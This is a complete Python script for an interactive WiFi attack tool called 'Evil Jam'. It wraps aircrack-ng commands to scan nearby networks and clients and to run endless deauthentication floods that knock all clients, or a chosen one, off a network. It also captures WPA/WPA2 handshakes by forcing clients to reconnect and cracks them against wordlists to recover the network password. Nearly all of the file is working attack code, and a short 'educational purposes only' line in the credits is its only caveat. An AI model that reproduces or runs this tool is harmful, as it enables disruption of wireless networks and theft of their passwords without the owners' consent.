import os
import sys
import time
import subprocess
import threading
import shutil  
import signal

class Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    YELLOW = '\033[93m'

def signal_handler(sig, frame):
    print(f"{Colors.FAIL}\nExiting tool...{Colors.ENDC}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def get_interfaces():
    interfaces = os.popen("ls /sys/class/net/").read().splitlines()
    return interfaces


def main_menu():
    os.system('clear')

    
    print("\033[1;35m" + "="*50)
    print("\033[1;37m" + " " * 5 + """
    _______    ________        _____    __  ___
   / ____/ |  / /  _/ /       / /   |  /  |/  /
  / __/  | | / // // /   __  / / /| | / /|_/ / 
 / /___  | |/ // // /___/ /_/ / ___ |/ /  / /  
/_____/  |___/___/_____/\____/_/  |_/_/  /_/   
                                               
""" + " " * 5)
    print("="*50 + "\033[0m")

    print("\033[1;32m" + "WELCOME TO THE WiFi JAM TOOL!".center(50) + "\033[0m")

    
    print("\033[1;36m" + """
1) WiFi Jam
2) Capture Handshake
3) Activate Monitor Mode
4) Activate Managed Mode
5) Crack Handshake
6) Credits
7) Exit
""" + "\033[0m")  

    choice = input("\033[1;37m" + "Choose an option: " + "\033[0m")

    if choice == "1":
        wiffijam()  
    elif choice == "2":
        eviljam()
    elif choice == "3":
        activate_monitor_mode()
    elif choice == "4":
        activate_managed_mode()  
    elif choice == "5":
        crackhandshake()
    elif choice == "6":
        show_credits()
    elif choice == "7":
        print("\033[1;31mExiting tool...\033[0m")
        exit()  
    else:
        print("\033[1;33mInvalid choice, try again.\033[0m")  
        time.sleep(20)




def scan_network(interface, timeout=10):
    """
    Scans for available WiFi networks on the specified interface.
    """
    print(f"{Colors.OKCYAN}Scanning for WiFi networks on {interface}...{Colors.ENDC}")

    
    os.makedirs("tmp", exist_ok=True)

    try:
        result = subprocess.Popen(
            f"airodump-ng --band abg --output-format csv --write tmp/scan_results {interface}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        time.sleep(timeout)  
        
        
        result.terminate() 
        result.wait()

        networks = []
        with open("tmp/scan_results-01.csv", "r") as file:
            data = file.readlines()

        for line in data[1:]:  
            parts = line.split(',')
            if len(parts) > 13:  
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                if bssid and essid and channel.isdigit():
                    
                    networks.append((bssid, essid, channel))
        return networks

    except Exception as e:
        print(f"{Colors.FAIL}Error occurred during network scan: {str(e)}{Colors.ENDC}")
        return []
    
    

def scan_clients(interface, bssid, channel, timeout=60):
    """
    Scans for clients connected to the target WiFi network.
    """
    print(f"{Colors.OKCYAN}Scanning clients connected to {bssid}...{Colors.ENDC}")

    
    os.makedirs("/tmp", exist_ok=True)

    try:
        result = subprocess.Popen(
            f"airodump-ng --bssid {bssid} --channel {channel} --output-format csv --write /tmp/client_results {interface}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        time.sleep(timeout)  

        
        result.terminate()
        result.wait()

        
        os.makedirs("tmp", exist_ok=True)
        shutil.copy("/tmp/client_results-01.csv", "tmp/client_results-01.csv")

        clients = []
        with open("/tmp/client_results-01.csv", "r") as file:
            data = file.readlines()

        
        client_section = False
        for line in data:
            if "Station MAC" in line:
                client_section = True
                continue
            if client_section and line.strip():  
                parts = line.split(',')
                if len(parts) > 0:
                    mac = parts[0].strip()
                    power = parts[3].strip() if len(parts) > 3 else None
                    if mac and power and power.lstrip('-').isdigit():
                        
                        clients.append((mac, power))
        
        if not clients:
            print(f"{Colors.WARNING}No clients detected. Exiting...{Colors.ENDC}")
        return clients

    except Exception as e:
        print(f"{Colors.FAIL}Error occurred during client scan: {str(e)}{Colors.ENDC}")
        return []

def switch_channel(interface, channel):
    """
    Switches the wireless interface to the correct channel.
    """
    print(f"{Colors.OKBLUE}Switching {interface} to Channel {channel}...{Colors.ENDC}")
    os.system(f"iw dev {interface} set channel {channel}")  
    time.sleep(1)  


def start_deauth_attack(interface, bssid, client_mac=None, channel=None, packets=100000):
    """
    Starts a deauthentication attack on all clients or a specific client connected to the target WiFi network.
    """
    print(f"{Colors.OKGREEN}[Step 3: Starting Deauthentication Attack]{Colors.ENDC}")

    
    print(f"{Colors.OKCYAN}Switching {interface} to channel {channel}...{Colors.ENDC}")
    switch_command = f"iw dev {interface} set channel {channel}"
    switch_process = subprocess.run(switch_command, shell=True, text=True, stderr=subprocess.PIPE)
    
    if switch_process.returncode != 0:
        print(f"{Colors.FAIL}Error setting channel: {switch_process.stderr}{Colors.ENDC}")
        return

    time.sleep(1)  

    try:
        if client_mac:
            
            print(f"{Colors.OKGREEN}Targeting specific client [{client_mac}] connected to BSSID {bssid}.{Colors.ENDC}")
            attack_command = f"aireplay-ng --deauth {packets} -a {bssid} -c {client_mac} {interface}"
            while True:
                print(f"{Colors.WARNING}ATTACK IS GOING ON CLIENT: [{client_mac}] - CHANNEL: {channel}{Colors.ENDC}")
                subprocess.run(attack_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(1)
        else:
            
            print(f"{Colors.OKGREEN}Targeting all clients connected to BSSID {bssid}.{Colors.ENDC}")
            attack_command = f"aireplay-ng --deauth {packets} -a {bssid} {interface}"
            while True:
                print(f"{Colors.WARNING}ATTACK IS GOING ON ALL CLIENTS CONNECTED TO: [{bssid}] - CHANNEL: {channel}{Colors.ENDC}")
                subprocess.run(attack_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}Attack stopped by user.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}An error occurred: {e}{Colors.ENDC}")


def wiffijam():
    """
    Main function to handle the script's execution flow.
    """
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")

    
    interfaces = os.listdir('/sys/class/net')
    wifi_interfaces = [iface for iface in interfaces if iface.startswith("wlan")]
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(wifi_interfaces, 1):
        print(f"{Colors.OKGREEN}{i}) {iface}{Colors.ENDC}")

    iface_choice = input(f"{Colors.OKCYAN}\nChoose your interface number: {Colors.ENDC}")
    try:
        iface_index = int(iface_choice) - 1
        interface = wifi_interfaces[iface_index]
        print(f"{Colors.OKGREEN}Selected Interface: {interface}{Colors.ENDC}")
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    
    networks = scan_network(interface)
    if not networks:
        print(f"{Colors.FAIL}No WiFi networks detected. Exiting...{Colors.ENDC}")
        return

    
    networks = list(set(networks))

    
    print(f"\n{Colors.OKGREEN}[Scan Complete]{Colors.ENDC}")
    print(f"{Colors.OKCYAN}Detected WiFi Networks:{Colors.ENDC}")
    for i, (bssid, essid, channel) in enumerate(networks, 1):
        print(f"{Colors.OKGREEN}{i}. {essid} (Channel: {channel}, BSSID: {bssid}){Colors.ENDC}")

    network_choice = input(f"{Colors.OKCYAN}\nChoose a WiFi network to target (Enter number or 'X' to exit): {Colors.ENDC}")
    if network_choice.upper() == 'X':
        print(f"{Colors.FAIL}Exiting...{Colors.ENDC}")
        return

    try:
        network_index = int(network_choice) - 1
        bssid, essid, channel = networks[network_index]
        print(f"{Colors.OKGREEN}Target WiFi Network: {essid} (BSSID: {bssid}, Channel: {channel}){Colors.ENDC}")
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    
    print(f"\n{Colors.OKBLUE}[Step 2: Choose Attack Mode]{Colors.ENDC}")
    print(f"{Colors.OKCYAN}1. Jam all clients{Colors.ENDC}")
    print(f"{Colors.OKCYAN}2. Jam a specific client{Colors.ENDC}")
    attack_choice = input(f"{Colors.OKCYAN}\nEnter your choice (1 or 2): {Colors.ENDC}")

    if attack_choice == "1":
        print(f"{Colors.OKGREEN}Starting deauthentication attack on all clients connected to {essid}...{Colors.ENDC}")
        start_deauth_attack(interface, bssid, channel=channel)  
    elif attack_choice == "2":
        
        clients = scan_clients(interface, bssid, channel)
        if not clients:
            print(f"{Colors.FAIL}No clients detected. Exiting...{Colors.ENDC}")
            return

        
        clients = list(set(clients))

        
        print(f"\n{Colors.OKCYAN}Detected Clients:{Colors.ENDC}")
        for i, (mac, power) in enumerate(clients, 1):
            print(f"{Colors.OKGREEN}{i}. MAC: {mac}, Power: {power}{Colors.ENDC}")

        client_choice = input(f"{Colors.OKCYAN}\nChoose a client to jam (Enter number): {Colors.ENDC}")
        try:
            client_index = int(client_choice) - 1
            client_mac, client_power = clients[client_index]
            start_deauth_attack(interface, bssid, client_mac, channel)  
        except (IndexError, ValueError):
            print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
            return
    else:
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return



    

def scan_networ(interface, timeout=30):
    """
    Scans for available WiFi networks.
    """
    print(f"{Colors.OKCYAN}Scanning for WiFi networks on {interface} for {timeout} seconds...{Colors.ENDC}")

    result = subprocess.Popen(
        f"airodump-ng --output-format csv --write /tmp/scan_results {interface}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    time.sleep(timeout)  
    result.terminate()
    result.wait()

    try:
        networks = []
        with open("/tmp/scan_results-01.csv", "r") as file:
            data = file.readlines()

        for line in data[1:]:
            parts = line.split(',')
            if len(parts) > 13:  
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                if bssid and essid and channel.isdigit():
                    networks.append((bssid, essid, channel))
        return networks

    except Exception as e:
        print(f"{Colors.FAIL}Error during scan: {str(e)}{Colors.ENDC}")
        return []

def capture_handshake(interface, bssid, channel, essid):
    """
    Captures the WPA/WPA2 handshake for a specific network.
    """
    try:
        handshake_dir = "Handshake"
        handshake_file = os.path.join(handshake_dir, f"{essid.replace(' ', '_')}_handshake")
        os.makedirs(handshake_dir, exist_ok=True)

        print(f"{Colors.YELLOW}Capturing handshake for BSSID {bssid} on Channel {channel}...{Colors.ENDC}")
        os.system(f"iw dev {interface} set channel {channel}")

        capture_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {handshake_file} --wps {interface} > /dev/null 2>&1"
        capture_process = subprocess.Popen(capture_cmd, shell=True)

        
        time.sleep(5)

        print(f"{Colors.YELLOW}Sending deauth packets to BSSID {bssid}...{Colors.ENDC}")
        deauth_cmd = f"aireplay-ng --deauth 5 -a {bssid} {interface} > /dev/null 2>&1"
        subprocess.Popen(deauth_cmd, shell=True)

        print(f"{Colors.OKGREEN}Please wait... (Listening for 30 seconds){Colors.ENDC}")
        time.sleep(30)

        capture_process.terminate()
        capture_process.wait()

        cap_file = f"{handshake_file}-01.cap"
        if os.path.exists(cap_file):
            print(f"{Colors.OKGREEN}Handshake successfully captured: '{cap_file}'{Colors.ENDC}")
            
            eapol_check_cmd = f"aircrack-ng {cap_file}"
            eapol_check_process = subprocess.Popen(eapol_check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = eapol_check_process.communicate()

        print(f"{Colors.OKGREEN}Redirecting back to Mainmenu in 8 seconds...{Colors.ENDC}")
        time.sleep(8)
        main_menu()

    except Exception as e:
        pass

def eviljam():
    """
    Main Evil Jam function for scanning and jamming WiFi networks.
    """
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")

    interfaces = os.listdir('/sys/class/net')
    wifi_interfaces = [iface for iface in interfaces if iface.startswith("wlan")]
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(wifi_interfaces, 1):
        print(f"{Colors.OKGREEN}{i}) {iface}{Colors.ENDC}")

    iface_choice = input(f"{Colors.OKCYAN}\nChoose your interface number: {Colors.ENDC}")
    try:
        interface = wifi_interfaces[int(iface_choice) - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    networks = scan_network(interface)
    if not networks:
        print(f"{Colors.FAIL}No networks found. Exiting...{Colors.ENDC}")
        return

    print(f"\n{Colors.OKGREEN}Networks found:{Colors.ENDC}")
    for i, (bssid, essid, channel) in enumerate(networks, 1):
        print(f"{Colors.OKCYAN}{i}. ESSID: {essid}, BSSID: {bssid}, Channel: {channel}{Colors.ENDC}")

    network_choice = input(f"\n{Colors.OKCYAN}Choose a network to target (Enter number): {Colors.ENDC}")
    try:
        bssid, essid, channel = networks[int(network_choice) - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    capture_handshake(interface, bssid, channel, essid)




def activate_monitor_mode():
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    
    for i, iface in enumerate(interfaces):
        print(f"{i + 1}) {iface}")
    
    try:
        choice = int(input("Choose your interface number: "))
        interface = interfaces[choice - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        exit()
    
    print(f"Activating monitor mode on {interface}...")
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    print(f"Monitor mode activated on {interface}.")
    time.sleep(2)
    main_menu()


def activate_managed_mode():
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")  
    
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    
    for i, iface in enumerate(interfaces):
        print(f"{i + 1}) {iface}")
    
    try:
        choice = int(input("Choose your interface number: "))
        interface = interfaces[choice - 1]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        exit()
    
    print(f"Deactivating monitor mode and switching to managed mode on {interface}...")
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type managed")
    os.system(f"sudo ip link set {interface} up")
    print(f"Managed mode activated on {interface}.")
    time.sleep(2)
    main_menu()

def list_filesz(directory, extension):
    """
    Lists files in the given directory with the specified extension.
    """
    return [f for f in os.listdir(directory) if f.endswith(extension)]

def crackhandshake():
    """
    Cracks the password of a handshake located in the Handshake folder using a wordlist from the Wordlist folder.
    """

    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    
    cap_files = list_filesz("Handshake", ".cap")
    if not cap_files:
        print(f"{Colors.FAIL}No .cap files found in the Handshake folder.{Colors.ENDC}")
        return

    
    wordlist_files = list_filesz("Wordlist", ".txt")
    if not wordlist_files:
        print(f"{Colors.FAIL}No .txt files found in the Wordlist folder.{Colors.ENDC}")
        return

    
    print(f"{Colors.OKCYAN}Available .cap files:{Colors.ENDC}")
    for i, cap_file in enumerate(cap_files, 1):
        print(f"{Colors.OKGREEN}{i}. {cap_file}{Colors.ENDC}")
    cap_choice = input(f"{Colors.OKCYAN}\nChoose a .cap file (Enter number): {Colors.ENDC}")
    try:
        cap_index = int(cap_choice) - 1
        cap_file = cap_files[cap_index]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    
    print(f"{Colors.OKCYAN}\nAvailable wordlists:{Colors.ENDC}")
    for i, wordlist_file in enumerate(wordlist_files, 1):
        print(f"{Colors.OKGREEN}{i}. {wordlist_file}{Colors.ENDC}")
    wordlist_choice = input(f"{Colors.OKCYAN}\nChoose a wordlist (Enter number): {Colors.ENDC}")
    try:
        wordlist_index = int(wordlist_choice) - 1
        wordlist_file = wordlist_files[wordlist_index]
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    
    cap_path = os.path.join("Handshake", cap_file)
    wordlist_path = os.path.join("Wordlist", wordlist_file)
    print(f"{Colors.OKCYAN}\nCracking password for {cap_file} using {wordlist_file}...{Colors.ENDC}")
    result = subprocess.run(["aircrack-ng", "-w", wordlist_path, cap_path], capture_output=True, text=True)

    
    os.makedirs("Passwords", exist_ok=True)
    
    password_file = os.path.join("Passwords", f"{cap_file}.txt")
    with open(password_file, "w") as f:
        f.write(result.stdout)
    print(f"{Colors.OKGREEN}Full output saved to {password_file}{Colors.ENDC}")



def show_credits():
    print("\n" + "-"*50)
    print("\033[1;36m" + "                      CREDITS                       ".center(50) + "\033[0m")
    print("-"*50)
    print("\033[1;35mTool owned by: DaddyDark".ljust(50) + "\033[0m")
    print("\033[1;33mSpecial thanks to all contributors.".ljust(50) + "\033[0m")
    print("\n\033[1;32mCopyright 2025 - All Rights Reserved.\033[0m")
    print("\033[1;31mThis tool is provided for educational purposes only.\033[0m")
    print("\033[1;31mUnauthorized use may violate laws in your jurisdiction.\033[0m")
    print("-"*50)
    time.sleep(20)
    main_menu()


if __name__ == "__main__":
    main_menu()